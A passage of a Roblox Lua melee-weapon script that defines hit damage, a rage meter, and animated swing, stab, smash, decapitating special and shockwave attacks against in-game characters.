        return dmg
end
 
function brickdamage(hit)
        local h = getHumanoid(hit.Parent)
        if h ~= nil and Hurt and Deb then
                Deb = false
                local dmg = damage(h, maintip, 0, Prop.Damage/4, Prop.Damage)
                PlaySound(hitsound)
                Prop.Rage = math.floor(Prop.Rage + (dmg*Prop.RageIncome))
                wait(0.3)
                Deb = true
        end
end
 
function legdamage(hit)
        local h = getHumanoid(hit.Parent)
        if h ~= nil and Leghurt and LegDeb then
                LegDeb = false
                local dmg = damage(h, Rleg, 0, Prop.Legdmg/2, Prop.Legdmg)
                PlaySound(hitsound)
                Prop.Rage = math.floor(Prop.Rage + (dmg*Prop.RageIncome))
                coroutine.resume(coroutine.create(function()
                        local haha = math.random(1,3)
                        if haha == 1 then
                                h.PlatformStand = true
                                wait()
                                local ps = getAllParts(h.Parent)
                                for i, v in pairs(ps) do
                                        if v.Anchored == false then
                                                v.Velocity = CFrame.new(handle.Position, v.Position).lookVector * 40
                                                v.RotVelocity = Vector3.new(math.random(-30, 30), math.random(-30, 30), math.random(-30, 30))
                                        end
                                end
                                wait(0.8)
                                h.PlatformStand = false
                        end
                end))
                wait(0.2)
                LegDeb = true
        end
end
 
for i, v in pairs({Rleg, Lleg}) do
        v.Touched:connect(legdamage)
end
 
for i,v in pairs(DMGParts) do
        v.Touched:connect(brickdamage)
end
 
if script.Parent.className ~= "HopperBin" then
        h = Instance.new("HopperBin",me.Backpack)
        h.Name = Toolname
        h.TextureId = ToolIcon
        script.Parent = h
end
 
bin = script.Parent
 
function StartEffect(part)
        effectOn = true
        local lastPoint = part.Position
        coroutine.resume(coroutine.create(function()
                while effectOn do
                        wait()
                        local point = CFrame.new(lastPoint, part.Position) * CFrame.Angles(-math.pi/2, 0, 0)
                        local mag = (lastPoint - part.Position).magnitude
                        local p = Part(workspace, true, false, 0.1, 0, "Really black", 1, 1, 1, true)
                        local m = Instance.new("SpecialMesh",p)
                        p.CFrame = point * CFrame.new(0, mag/2, 0)
                        m.Scale = Vector3.new(1.2, mag+0.6, 1.2)
                        lastPoint = part.Position
                        coroutine.resume(coroutine.create(function() for i = 0.1, 1, 0.9/5 do wait() p.Transparency = i end p:remove() end))
                end
        end))
end
 
function EndEffect()
        effectOn = false
end
 
function detach(bool)
        LLW.C0 = CFrame.new(0, 0, 0)
        RLW.C0 = CFrame.new(0, 0, 0)
        LAW.C0 = CFrame.new(0,0,0)
        RAW.C0 = CFrame.new(0, 0, 0)
        if bool then
                LLW.Part1 = nil
                RLW.Part1 = nil
                RAW.Part1 = nil
                LAW.Part1 = nil
        end
end
 
function attach()
        RAW.Part1 = Rarm
        LAW.Part1 = Larm
        RLW.Part1 = Rleg
        LLW.Part1 = Lleg
end
 
function normal()
        neck.C0 = necko
        RAW.C0 = RAWStand
        LAW.C0 = LAWStand
        RLW.C0 = RLWStand
        LLW.C0 = LLWStand
        RAW.C1 = CFrame.new(0, 0.5, 0)
        LAW.C1 = CFrame.new(0, 0.5, 0)
        RLW.C1 = CFrame.new(0, 0.8, 0)
        LLW.C1 = CFrame.new(0, 0.8, 0)
        HW.C0 = HWStand
end
 
function idleanim()
        attach()
        for i = 0, 10, 10/22 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(i), 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-i), 0, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(i/8), 0, math.rad(-i/6))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-i/8), 0, math.rad(i/6))
                neck.C0 = necko * CFrame.Angles(math.rad(-i/2), 0, 0)
                if selected == false or torso.Velocity.magnitude > 2 or Able == false or RestingAnim == true then break end
                wait()
        end
        wait()
        for i = 10, 0, -10/29 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(i), 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-i), 0, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(i/8), 0, math.rad(-i/6))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-i/8), 0, math.rad(i/6))
                neck.C0 = necko * CFrame.Angles(math.rad(-i/2), 0, 0)
                if selected == false or torso.Velocity.magnitude > 2 or Able == false or RestingAnim == true then break end
                wait()
        end
        normal()
end
 
function runanim()
        RLW.Part1 = nil
        LLW.Part1 = nil
end
 
coroutine.resume(coroutine.create(function()
        while true do
                wait()
                if selected and Able == true and RestingAnim == false then
                        if torso.Velocity.magnitude < 2 then
                                idleanim()
                                wait()
                        else
                                runanim()
                                wait()
                        end
                end
        end
end))
 
function selectanim()
        if RestingAnim == false and Able == true then
        local ah = CFrame.Angles(0, 0, math.rad(90))
        RAW.Part1 = Rarm
        for i = 0, 270, 270/5 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i/5))
                wait()
        end
        HW.C0 = ah
        HW.Part1 = handle
        TH.Part1 = nil
        PlaySound(equip)
        for i = 270, 70, -200/13 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(math.rad((i-270)/7), 0, math.rad(-i/5))
                wait()
        end
        attach()
        for i = 70, 120, 50/8 do
                local asd = i-70
                RAW.C0 = CFrame.new(-(i-70)/240, 0, -i/500) * CFrame.Angles(math.rad(70), math.rad(70/4+(i-70)), math.rad(-(i-70)/4))
                LAW.C0 = CFrame.Angles(math.rad(asd*1.5), 0, math.rad(asd/2)) * CFrame.new(asd/100, -asd/70, 0)
                HW.C0 = ah * CFrame.Angles(0, 0, math.rad(-asd*1.8))
                neck.C0 = necko * CFrame.Angles(math.rad(-200/7+(asd/2)), 0, math.rad(-70/5+(asd/5)))
                RLW.C0 = CFrame.Angles(0, 0, math.rad(asd/4))
                LLW.C0 = CFrame.Angles(0, 0, math.rad(-asd/4))
                wait()
        end
        if RAWStand == nil then
                RAWStand = RAW.C0
                LAWStand = LAW.C0
                RLWStand = RLW.C0
                LLWStand = LLW.C0
                HWStand = HW.C0
        end
        normal()
        end
end
 
function deselanim()
        if RestingAnim == false and Able == true then
        local ah = CFrame.Angles(0, 0, math.rad(90))
        for i = 120, 70, -50/8 do
                local asd = i-70
                RAW.C0 = CFrame.new(-(i-70)/240, 0, -i/500) * CFrame.Angles(math.rad(70), math.rad(70/4+(i-70)), math.rad(-(i-70)/4))
                LAW.C0 = CFrame.Angles(math.rad(asd*1.5), 0, math.rad(asd/2)) * CFrame.new(asd/100, -asd/70, 0)
                HW.C0 = ah * CFrame.Angles(0, 0, math.rad(-asd*1.8))
                neck.C0 = necko * CFrame.Angles(math.rad(-200/7+(asd/2)), 0, math.rad(-70/5+(asd/5)))
                RLW.C0 = CFrame.Angles(0, 0, math.rad(asd/4))
                LLW.C0 = CFrame.Angles(0, 0, math.rad(-asd/4))
                wait()
        end
        LLW.Part1 = nil
        RLW.Part1 = nil
        LAW.Part1 = nil
        for i = 70, 270, 200/13 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(math.rad((i-270)/7), 0, math.rad(-i/5))
                wait()
        end
        HW.C0 = ah
        HW.Part1 = nil
        TH.Part1 = handle
        for i = 270, 0, -270/6 do
                RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i/5))
                wait()
        end
        neck.C0 = necko
        detach(true)
        end
end
 
function smash(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        local CF2 = CF
        bg.cframe = CF2
        PlaySound(slash)
        for i = 0, 1, Prop.AS*1.1 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(80*i), 0, math.rad(45*i)) * CFrame.new(0, -0.4*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(75*i), 0, math.rad(40*i)) * CFrame.new(0, -0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20*i), math.rad(16*i), math.rad(-8*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30*i), math.rad(-16*i), math.rad(8*i))
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(30*i))
                neck.C0 = necko * CFrame.Angles(math.rad(-35*i), 0, math.rad(-10*i))
                wait()
        end
        bp.position = CF * CFrame.new(0, 0, -1.1).p
        StartEffect(maintip)
        Hurt = true
        for i = 0, 1, Prop.AS*1.5 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-150*i), math.rad(-45*i), math.rad(45-140*i)) * CFrame.new(0, -0.4, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(75-180*i), math.rad(80*i), math.rad(40-20*i)) * CFrame.new(0, -0.5, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-50*i), math.rad(16-16*i), math.rad(-8+8*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30+40*i), math.rad(-16+16*i), math.rad(8-8*i))
                HW.C0 = HWStand * CFrame.Angles(math.rad(-48*i), 0, math.rad(30))
                neck.C0 = necko * CFrame.Angles(math.rad(-35+75*i), 0, math.rad(-10+26*i))
                wait()
        end
        Hurt = false
        EndEffect()
        PlaySound(smashsound)
        bp.position = CF * CFrame.new(0, 0, -1.9).p
        for i = 0, 1, Prop.AS do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-150+80*i), math.rad(-45+45*i), math.rad(45-140+95*i)) * CFrame.new(0, -0.4+0.4*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(75-180+105*i), math.rad(80-80*i), math.rad(20-20*i)) * CFrame.new(0, -0.5+0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-50+30*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30+40-10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-48+48*i), 0, math.rad(30-30*i))
                neck.C0 = necko * CFrame.Angles(math.rad(-35+75-40*i), 0, math.rad(-10+26-16*i))
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
end
 
function swing(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        local CF2 = CF
        bg.cframe = CF2
        PlaySound(slash)
        for i = 0, 1, Prop.AS*1.5 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(-140*i), 0) * CFrame.new(0, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(25*i), 0, math.rad(20*i)) * CFrame.new(0, -0.4*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, math.rad(-10*i), 0)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-40*i), 0)
                wait()
        end
        Hurt = true
        StartEffect(maintip)
        for i = 0, 1, Prop.AS*1.3 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70*i), math.rad(-140), 0) * CFrame.new(0, -0.9*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(25), 0, math.rad(20-100*i)) * CFrame.new(0, -0.4+0.6*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70*i), math.rad(-15), 0) * CFrame.new(0, 0, -0.9*i)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50+90*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-40+80*i), 0)
                wait()
        end
        EndEffect()
        Hurt = false
        for i = 0, 1, Prop.AS*0.8 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-70*i), math.rad(-140+140*i), 0) * CFrame.new(0, -0.9+0.9*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(25-25*i), 0, math.rad(20-100+80*i)) * CFrame.new(0, -0.4+0.6-0.2*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-20*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10+10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70+70*i), math.rad(-15+15*i), 0) * CFrame.new(0, 0, -0.9+0.9*i)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50+90-40*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(40-40*i), 0)
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
end
 
function stab(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        local CF2 = CF
        bg.cframe = CF2
        PlaySound(slash)
        for i = 0, 1, Prop.AS do
                RAW.C0 = RAWStand * CFrame.new(0, 0.6*i, 0) * CFrame.Angles(math.rad(-60*i), math.rad(-40*i), math.rad(-30*i)) * CFrame.new(-0.45*i, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50*i), 0, math.rad(40*i)) * CFrame.new(0, -0.6*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(3*i), math.rad(20*i), math.rad(-10*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3*i), math.rad(-20*i), math.rad(10*i))
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(25*i), 0, math.rad(-45*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30*i), 0)
                wait()
        end
        StartEffect(maintip)
        Hurt = true
        bp.position = CF * CFrame.new(0, 0, -0.6).p
        for i = 0, 1, Prop.AS*1.5 do
                RAW.C0 = RAWStand * CFrame.new(0, 0.6-0.8*i, 0) * CFrame.Angles(math.rad(-60+100*i), math.rad(-40), math.rad(-30+70*i)) * CFrame.new(-0.45, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50+60*i), 0, math.rad(40-30*i)) * CFrame.new(0, -0.6-0.4*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(3-18*i), math.rad(20-40*i), math.rad(-10+20*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3+18*i), math.rad(-20+40*i), math.rad(10-20*i))
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70*i), 0, 0) * CFrame.new(0, 0, 1-1.4*i)
                neck.C0 = necko * CFrame.Angles(math.rad(25-20*i), 0, math.rad(-45+35*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30+45*i), 0)
                wait()
        end
        Hurt = false
        EndEffect()
        bp.position = CF.p
        for i = 0, 1, Prop.AS*1.1 do
                RAW.C0 = RAWStand * CFrame.new(0, 0.6-0.8+0.2*i, 0) * CFrame.Angles(math.rad(-60+100-40*i), math.rad(-40+40*i), math.rad(-30+70-40*i)) * CFrame.new(-0.45+0.45*i, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50+60-10*i), 0, math.rad(40-30-10*i)) * CFrame.new(0, -0.6-0.4+1*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(3-18+15*i), math.rad(20-40+20*i), math.rad(-10+20-10*i))
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3+18-15*i), math.rad(-20+40-20*i), math.rad(10-20+10*i))
                HW.C0 = HWStand * CFrame.Angles(math.rad(-70+70*i), 0, 0) * CFrame.new(0, 0, 1-1.4+0.4*i)
                neck.C0 = necko * CFrame.Angles(math.rad(5-5*i), 0, math.rad(-10+10*i))
                bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30+45-15*i), 0)
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
end
 
function epicsmashfunc(hit)
        local ch = hit.Parent
        local h = getHumanoid(ch)
        local t, head = ch:findFirstChild("Torso"), ch:findFirstChild("Head")
        return h, t, head
end
 
function epicsmash(mouse)
        if Prop.Rage >= 50 then
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        local CF = ComputePos(Orig.p, mouseHit)
        bg.cframe = CF
        local hu, to, head = nil, nil, nil
        local Epic = true
        local conn = Lleg.Touched:connect(function(hit)
                if Epic then
                        hu, to, head = epicsmashfunc(hit)
                        if hu and to and head then Epic = false end
                end
        end)
        PlaySound(slash)
        for i = 0, 1, 0.12 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160*i), math.rad(-30*i), math.rad(-80*i)) * CFrame.new(0, 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80*i), 0, math.rad(-70*i)) * CFrame.new(0, -0.4*i, 0.6*i)
                RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20*i)) * CFrame.new(0, 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(115*i), 0, math.rad(-40*i)) * CFrame.new(0, -0.8*i, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2*i)
                neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52*i))
                bg.cframe = CF * CFrame.Angles(math.rad(10*i), math.rad(-45*i), math.rad(-15*i))
                wait()
        end
        conn:disconnect()
        if hu and to and head then
                Prop.Rage = Prop.Rage - 50
                hu.PlatformStand = true
                local bg2 = Add.BG(to)
                bg2.P = 6000
                bg2.cframe = CF * CFrame.Angles(math.rad(90), math.rad(180), math.rad(90))
                local bp2 = Add.BP(to)
                bp2.position = CF * CFrame.new(-1, -4, -4).p
                bp2.P = 5000
                wait(0.1)
                for i = 0, 1, 0.045 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270*i), math.rad(-30+20*i), math.rad(-80+120*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140*i), 0, math.rad(-70+120*i)) * CFrame.new(0, -0.4-0.1*i, 0.6-0.6*i)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20-20*i)) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(115-115*i), 0, math.rad(-40+40*i)) * CFrame.new(0, -0.8+0.8*i, 0)
                        HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2-2*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-37*i))
                        bg.cframe = CF * CFrame.Angles(math.rad(10-10*i), math.rad(-45+35*i), math.rad(-15+15*i))
                        wait()
                end
                PlaySound(slash)
                bp2:remove()
                bg2:remove()
                wait(0.2)
                StartEffect(maintip)
                for i = 0, 1, 0.1 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270-190*i), math.rad(-30+20-35*i), math.rad(-80+120-135*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140-150*i), math.rad(60*i), math.rad(-70+120-40*i)) * CFrame.new(0, -0.4-0.1, 0)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(math.rad(-55*i), 0, math.rad(30*i)) * CFrame.new(0, 0, -1*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-37+30*i))
                        bg.cframe = CF * CFrame.Angles(math.rad(10-10), math.rad(-45+35-30*i), math.rad(-15+15))
                        wait()
                end
                coroutine.resume(coroutine.create(function()
                        local frr = Cam.CoordinateFrame
                        for i = 1, math.random(3,6) do
                                wait()
                                Cam.CoordinateFrame = frr * CFrame.new(math.random(-6,6)/10, math.random(-6,6)/10, math.random(-6,6)/10)
                        end
                end))
                PlaySound(smashsound)
                EndEffect()
                local pos = head.Position
                if (pos - maintip.Position).magnitude < 2 then
                damage(hu, head, 0.3, hu.Health, hu.Health)
                head:remove()
                PlaySound(hitsound)
                for i = 1, math.random(7, 17) do
                        local hmm = math.random(1,6)
                        if hmm < 6 then
                                local cols = {"White", "Really red"}
                                local p = Part(workspace, false, false, 0, 0, cols[math.random(1,#cols)], math.random(2,10)/10, 0.2, math.random(2,10)/10)
                                p.CFrame = CFrame.new(pos) * CFrame.new(math.random(-6,6)/10, math.random(-4,2)/10, math.random(-6, 6)/10)
                                p.Velocity = Vector3.new(math.random(-15, 15), math.random(5, 40), math.random(-15, 15))
                                p.RotVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
                        else
                                local cols = {"Institutional white", "White"}
                                local p = Part(workspace, false, false, 0, 0, cols[math.random(1,#cols)], math.random(4,13)/10, 0.3, math.random(2,3)/10)
                                p.CFrame = CFrame.new(pos) * CFrame.new(math.random(-6,6)/10, math.random(-4,2)/10, math.random(-6, 6)/10)
                                p.Velocity = Vector3.new(math.random(-15, 15), math.random(5, 40), math.random(-15, 15))
                                p.RotVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
                        end
                end
                end
                for i = 0, 1, 0.06 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270-190+80*i), math.rad(-30+20-35+45*i), math.rad(-80+120-135+95*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140-150+90*i), math.rad(60-60*i), math.rad(10-10*i)) * CFrame.new(0, -0.4-0.1+0.5*i, 0)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(math.rad(-55+55*i), 0, math.rad(30-30*i)) * CFrame.new(0, 0, -1+1*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(45-45*i))
                        bg.cframe = CF * CFrame.Angles(0, math.rad(-45+35-20+30*i), 0)
                        wait()
                end
        else
                for i = 0, 1, 0.08 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+160*i), math.rad(-30+30*i), math.rad(-80+80*i)) * CFrame.new(0, 0, 0)
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+80*i), 0, math.rad(-70+70*i)) * CFrame.new(0, -0.4+0.4*i, 0.6-0.6*i)
                        RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20-20*i)) * CFrame.new(0, 0, 0)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(115-115*i), 0, math.rad(-40+40*i)) * CFrame.new(0, -0.8+0.8*i, 0)
                        HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2-2*i)
                        neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-52*i))
                        bg.cframe = CF * CFrame.Angles(math.rad(10-10*i), math.rad(-45+45*i), math.rad(-15+15*i))
                        wait()
                end
                bg:remove()
                bp:remove()
                normal()
        end
        normal()
        bg:remove()
        bp:remove()
        end
end
 
 
function shockwave(mouse)
        local p, t = RayCast(torso.Position, torso.CFrame * CFrame.new(0, -5, 0).p, 5, 1)
        if Prop.Rage >= 80 and t then
        Prop.Rage = Prop.Rage - 80
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.P = 5000
        local CF = ComputePos(Orig.p, mouseHit)
        bg.cframe = CF
        PlaySound(charge)
        for i = 0, 1, 0.07 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-110*i), math.rad(-40*i), math.rad(-50*i)) * CFrame.new(0.2*i, 0, 0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100*i), 0, math.rad(-40*i)) * CFrame.new(-0.2*i, -0.4*i, 0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, math.rad(-10*i)) * CFrame.new(0, 0.7*i, -0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75*i), 0, math.rad(10*i)) * CFrame.new(0, 0.4*i, 0.2*i)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(30*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = Orig.p + Vector3.new(0, -1.9*i, 0)
                wait()
        end
        for i = 0, 1, 0.04 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-110+220*i), math.rad(-40+50*i), math.rad(-50+90*i)) * CFrame.new(0.2-0.2*i, -0.85*i, 0.2-0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100+185*i), 0, math.rad(-40+75*i)) * CFrame.new(-0.2-0.2*i, -0.4-0.05*i, 0.5-0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15-25*i), 0, math.rad(-10+6*i)) * CFrame.new(0, 0.7-0.7*i, -0.8+0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75+65*i), 0, math.rad(10-6*i)) * CFrame.new(0, 0.4-0.4*i, 0.2-0.2*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-15*i), 0, 0) * CFrame.new(0, 0, 1.6-2.1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(30-70*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = Orig.p + Vector3.new(0, -1.9+17*i, 0)
                wait()
        end
        bp.P = 12001
        wait(0.1)
        StartEffect(maintip)
        PlaySound(slash)
        for i = 0, 1, 0.1 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150*i), math.rad(10-30*i), math.rad(40-90*i)) * CFrame.new(0, -0.85+0.85*i, -0.8*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-125*i), 0, math.rad(35)) * CFrame.new(0, -0.45+0.1, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(-10+25*i), 0, math.rad(-4+4*i)) * CFrame.new(0, 0.5*i, -0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10-35*i), 0, math.rad(4-4*i)) * CFrame.new(0, 0.4*i, 0.2*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-15-10*i), 0, 0) * CFrame.new(0, 0, -0.5+0.7*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-40+75*i), 0, math.rad(-20*i))
                bg.cframe = CF * CFrame.Angles(0, math.rad(380*i), 0)
                bp.position = Orig.p + Vector3.new(0, 15.1-16.7*i, 0)
                wait()
        end
        coroutine.resume(coroutine.create(function()
                local frr = Cam.CoordinateFrame
                for i = 1, math.random(10,16) do
                        wait()
                        Cam.CoordinateFrame = frr * CFrame.new(math.random(-15,15)/10, math.random(-15,15)/10, math.random(-15,15)/10)
                end
        end))
        PlaySound(smashsound)
        local pos = CF * CFrame.new(-2, -3, -3).p
        EndEffect()
        local p = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
        p.CFrame = CFrame.new(pos)
        local p2 = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
        p2.CFrame = CFrame.new(pos)
        local p3 = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
        p3.CFrame = CFrame.new(pos)
        local m3 = Instance.new("SpecialMesh",p3)
        m3.MeshType = "Sphere"
        PlaySound(boom)
        local m2 = Instance.new("CylinderMesh",p2)
        local m = Add.Mesh(p, "http://www.roblox.com/asset/?id=20329976", 1, 1.2, 1)
        local tab = {}
        coroutine.resume(coroutine.create(function()
                for x = 0, 1.04, 0.04 do
                        wait()
                        local thing = 33*x
                        m.Scale = Vector3.new(21*x, 5*x, 21*x)
                        m2.Scale = Vector3.new(thing, 1, thing)
                        m3.Scale = Vector3.new(thing*0.93, thing*0.7, thing*0.93)
                        p.Transparency = x
                        p2.Transparency = x
                        p3.Transparency = x
                        for i, v in pairs(workspace:children()) do
                                local h = getHumanoid(v)
                                local to = v:findFirstChild("Torso")
                                if h ~= nil and to ~= nil and find(tab, v) == nil then
                                        if (to.Position - pos).magnitude < (thing/2) then
                                                damage(h, to, 0.5, Prop.ShockDMG/2, Prop.ShockDMG)
                                                to.Velocity = CFrame.new(pos, to.Position).lookVector * 60
                                                to.RotVelocity = Vector3.new(math.random(-30, 30), math.random(-30, 30), math.random(-30, 30))
                                                h.PlatformStand = true
                                                table.insert(tab, v)
                                                coroutine.resume(coroutine.create(function() wait(1.2) h.PlatformStand = false end))
                                        end
                                end
                        end
                end
                p:remove()
                p2:remove()
                p3:remove()
        end))
        wait(0.8)
        for i = 0, 1, Prop.AS*0.8 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150+40*i), math.rad(10-30+20*i), math.rad(40-90+50*i)) * CFrame.new(0, 0, -0.8+0.8*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-125+40*i), 0, math.rad(35-35*i)) * CFrame.new(0, -0.45+0.1+0.35*i, 0)
